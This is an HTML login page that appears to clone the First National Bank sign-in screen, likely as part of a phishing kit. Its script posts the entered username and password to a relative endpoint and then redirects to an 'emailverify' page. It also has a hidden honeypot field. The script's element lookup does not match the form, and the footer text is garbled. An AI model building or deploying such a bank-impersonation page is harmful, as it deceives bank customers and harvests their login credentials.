<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Login - The FNB</title>
       <!-- Favicons -->
      <link href="../images/icon.PNG" rel="icon" type="image/icon">
      <link href="../images/icon.PNG" rel="apple-touch-icon" type="image/icon">

      <link rel="stylesheet" href="../index.css">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
   </head>
   <body>
      <header>
         <section>
            <div>
               <img src="../images/first-logo.png" alt="" style="margin-bottom: 20px;">
               <form name="fnbsignin" action="/api/signin/" method="POST">
                  <input type="text" name="bot-field" style="display: none; visibility: hidden;">
                  <input type="text" name="username" placeholder="Username" required>
                  <input type="password" name="password" placeholder="Enter your password" required>
                  <a href="#">Forgot?</a>
                  <div class="forbut">
                     <span class="chan"><i class="bi bi-fingerprint"></i>Sign in with a passkey</span>
                     <button type="submit">Sign in</button>
                  </div>
               </form>
            </div>
         </section>
      </header>
      <footer>
         <ul>
            <li>Â©  2024 First National Bank  </li>
            <li>(800) 564-3195</li>
            <li class="chan">Privacy policy</li>
            <li>Member FDIC </li>
            <li> Equal Housing Lender</li>
         </ul>
      </footer>


      <script>
         document.getElementById('fnbsignin').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            const formData = new FormData(this);

            const response = await fetch('/api/signin/', {
                method: 'POST',
                body: JSON.stringify({
                    username: formData.get('username'),
                    password: formData.get('password'),
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            });

            if (response.ok) {
                window.location.href = '/emailverify'; // Redirect to emailverify page
            } else {
                alert('Failed to submit. Try again!');
            }
        });
      </script>
   </body>
</html>
